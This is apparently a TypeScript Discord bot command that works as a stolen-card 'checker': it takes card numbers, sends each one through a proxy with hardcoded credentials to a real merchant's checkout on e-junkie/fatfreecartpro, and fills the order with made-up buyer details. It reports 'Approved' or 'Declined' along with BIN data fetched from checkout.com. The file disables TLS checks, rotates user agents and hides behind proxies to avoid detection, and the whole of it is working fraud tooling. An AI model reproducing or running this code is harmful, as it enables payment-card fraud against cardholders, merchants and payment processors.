import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";

const PROXY_CONFIG = {
  host: "brd.superproxy.io",
  port: 33335,
  auth: {
    username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
    password: "2rupnulv0s5o",
  },
};

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});

function generateRandomString(length: number, type: 'letters' | 'digits' = 'letters'): string {
  const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const chars = type === 'letters' ? letters : digits;
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function getRandomUserAgent(): string {
  const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  ];
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function parseJsonValue(source: string, leftDelim: string, rightDelim: string): string {
  const leftIndex = source.indexOf(leftDelim);
  if (leftIndex === -1) return "";
  const start = leftIndex + leftDelim.length;
  const rightIndex = source.indexOf(rightDelim, start);
  if (rightIndex === -1) return "";
  return source.substring(start, rightIndex);
}

function getCardBrand(firstDigit: string): string {
  if (firstDigit === "4") return "Visa";
  if (firstDigit === "5") return "MasterCard";
  return "Unknown";
}

const CLIENT = "416787";
const PROD = "14719";

export const data = new SlashCommandBuilder()
  .setName("au")
  .setDescription("Authorization test")
  .addStringOption((option) =>
    option
      .setName("card")
      .setDescription("Card details in format: CC|MM|YYYY or CC|MM|YYYY|CVV (CVV is ignored)")
      .setRequired(true)
  );

export async function execute(interaction: ChatInputCommandInteraction) {
  await interaction.deferReply();

  const cardInput = interaction.options.getString("card", true);
  console.log("[AU] Card:", cardInput);
  const parts = cardInput.split("|");

  if (parts.length !== 3 && parts.length !== 4) {
    await interaction.editReply({
      content: "❌ Invalid format. Use: CC|MM|YYYY or CC|MM|YYYY|CVV (e.g., 4111111111111111|12|2025)",
    });
    return;
  }

  const [cc, mm, yyyy, cvv] = parts.length === 3 
    ? [...parts.map((p) => p.trim()), ""] 
    : parts.map((p) => p.trim());

  // Extract 2-digit year from input
  let yy1: string;
  if (yyyy.length === 4) {
    yy1 = yyyy.substring(2);
  } else if (yyyy.length === 2) {
    yy1 = yyyy;
  } else {
    await interaction.editReply({
      content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
    });
    return;
  }

  // Remove leading zero from month if present
  const mm1 = mm.startsWith("0") ? mm.substring(1) : mm;
  const firstDigit = cc.substring(0, 1);
  const cardType = getCardBrand(firstDigit);

  if (!cc || !mm || !yyyy) {
    await interaction.editReply({
      content: "❌ Required fields: CC|MM|YYYY (CVV is optional and ignored)",
    });
    return;
  }

  try {
    const N1 = generateRandomString(6, 'letters');
    const N2 = generateRandomString(6, 'letters');
    const N3 = generateRandomString(6, 'letters');
    const ran3 = generateRandomString(3, 'digits');
    const ran5 = generateRandomString(5, 'digits');
    const UA = getRandomUserAgent();

    const embed = new EmbedBuilder()
      .setTitle("Authorization Test")
      .setColor(0x0099ff)
      .setDescription("Checking Card...")
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}\``, inline: true })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    let amount = "";
    let currency = "";
    let processor = "";
    let respMsg = "";
    let success = false;

    try {
      // Step 1: Load cart from e-junkie
      const cartUrl = `https://www.e-junkie.com/ecom/gbv3.php?=&c=cart&ejc=2&cl=${CLIENT}&i=${PROD}`;
      console.log("[AU] Fetching cart from:", cartUrl);

      const cartResponse = await axios.get(cartUrl, {
        proxy: PROXY_CONFIG,
        httpsAgent: httpsAgent,
        headers: {
          "User-Agent": UA,
          "Pragma": "no-cache",
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.8",
        },
        timeout: 10000,
      });

      const cartData = String(cartResponse.data);

      // Check for product errors
      if (cartData.includes('"Errors":["This product is')) {
        throw new Error("Product error");
      }

      // Parse cart endpoint
      let cartEndpoint = parseJsonValue(cartData, '"cc":{"status":true,"endpoint":"', '"');
      cartEndpoint = cartEndpoint.replace(/\\/g, "");

      if (!cartEndpoint) {
        throw new Error("Failed to get cart endpoint");
      }

      // Step 2: Get cart details
      const cartDetailsResponse = await axios.get(cartEndpoint, {
        proxy: PROXY_CONFIG,
        httpsAgent: httpsAgent,
        headers: {
          "User-Agent": UA,
        },
        timeout: 10000,
      });

      const cartDetailsData = String(cartDetailsResponse.data);
      processor = parseJsonValue(cartDetailsData, '"processor":"', '"');
      amount = parseJsonValue(cartDetailsData, '"total":"', '"');
      currency = parseJsonValue(cartDetailsData, '"currency":"', '"');
      const id = parseJsonValue(cartDetailsData, '"id":"', '"');
      const md5 = parseJsonValue(cartDetailsData, '"md5":"', '"');

      if (!id || !md5 || !processor) {
        throw new Error("Failed to get cart details");
      }

      // Step 3: Process payment
      const email = `${N1}.${ran5}@gmail.com`;
      const paymentResponse = await axios.post(
        "https://www.fatfreecartpro.com/ecom/ppdirect2.php",
        `&amount=${amount}&cur=${currency}&cart_id=${id}&cart_md5=${md5}&card_type=${cardType}&card=${cc}&cvv2=&exp_mm=${mm}&exp_yyyy=20${yy1}&address_same=true&em_updates=false&email=${email}&name=${N1} ${N2}&fname=${N1}&lname=${N2}&company_name=&phone=13${ran3}${ran5}&address=${ran3} ${N3} street&address2=&city=${N3}&state=${N1}&zip=${ran5}&country=RW&shipping_name=&shipping_fname=&shipping_lname=&shipping_company_name=&shipping_phone=&shipping_address=&shipping_address2=&shipping_city=&shipping_country=US&shipping_state=&shipping_zip=&requiresCardinalCommerce=false&json=true`,
        {
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: {
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.fatfreecartpro.com",
            "referer": `https://www.fatfreecartpro.com/ecom/ccv3/?client_id=${CLIENT}&cart_id=${id}&cart_md5=${md5}&c=cc&ejc=4&`,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "user-agent": UA,
          },
          timeout: 15000,
        }
      );

      
      // Handle both JSON object and string responses
      let paymentData: string;
      if (typeof paymentResponse.data === 'object') {
        paymentData = JSON.stringify(paymentResponse.data);
      } else {
        paymentData = String(paymentResponse.data);
      }

      // Check for errors
      if (paymentData.includes('"4","252') || 
          paymentData.includes('"3","251') || 
          paymentData.includes("failed validation") || 
          paymentData.includes("Cart error")) {
        success = false;
      } else if (paymentData.includes('"4","253') || 
                 paymentData.includes('"status":true') || 
                 paymentData.includes("of an AVS mismatch.")) {
        success = true;
      } else if (paymentData.includes('"status":false')) {
        success = false;
      }

      // Parse error message if exists
      let errorMsg = parseJsonValue(paymentData, ',"error":["', '"]');
      if (errorMsg) {
        errorMsg = errorMsg.replace(/","/g, ":");
        respMsg = `${errorMsg}`;
      } else {
        respMsg = `${processor}`;
      }
      console.log("[AU] Final success status:", success, "Response message:", respMsg);
    } catch (error: any) {
      console.error("[AU] Payment error:", error.message);
    }

    // Get BIN info
    let binInfo = "";
    let issuer = "";
    let cardTypeBin = "";
    let cardCategory = "";
    let productType = "";
    let issuerCountry = "";

    try {
      const checkoutResponse = await axios.post(
        "https://api.checkout.com/tokens",
        {
          type: "card",
          number: cc,
          expiry_month: parseInt(mm),
          expiry_year: parseInt(yyyy),
          cvv: "",
          phone: {},
          preferred_scheme: "",
          requestSource: "JS",
        },
        {
          headers: {
            accept: "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.6",
            authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
            "content-type": "application/json",
            origin: "https://js.checkout.com",
            referer: "https://js.checkout.com/",
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
          },
          timeout: 10000,
        }
      );

      const binData = checkoutResponse.data;
      const binFull = parseJsonValue(JSON.stringify(binData), '"bin":"', '"');
      issuer = parseJsonValue(JSON.stringify(binData), '"issuer":"', '"');
      cardTypeBin = parseJsonValue(JSON.stringify(binData), '"card_type":"', '"');
      cardCategory = parseJsonValue(JSON.stringify(binData), '"card_category":"', '"');
      productType = parseJsonValue(JSON.stringify(binData), '"product_type":"', '"');
      issuerCountry = parseJsonValue(JSON.stringify(binData), '"issuer_country":"', '"');

      binInfo = `${issuer} - ${cardTypeBin} ${cardCategory} - ${productType} - ${issuerCountry}`;
    } catch (error: any) {
      console.error("[AU] Checkout.com error:", error.message);
    }

    const resultEmbed = new EmbedBuilder()
      .setTitle(success ? `✅ Approved ${amount}$ Authnet` : `❌ Declined ${amount}$ Authnet`)
      .setColor(success ? 0x00ff00 : 0xff0000)
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}\``, inline: false })
      .setTimestamp();

    if (respMsg) {
      resultEmbed.addFields({
        name: "Response",
        value: respMsg,
        inline: false,
      });
    }

    if (binInfo) {
      resultEmbed.addFields({
        name: "Bindata",
        value: binInfo,
        inline: false,
      });
    }

    if (!respMsg) {
      resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
    }

    const username = interaction.user.username || interaction.user.tag;
    resultEmbed.setFooter({ text: `Checked by ${username}` });

    await interaction.editReply({ embeds: [resultEmbed] });
  } catch (error: any) {
    console.error("[AU] Error:", error.message);
    await interaction.editReply({
      content: `❌ Error testing card: ${error.message}`,
    });
  }
}

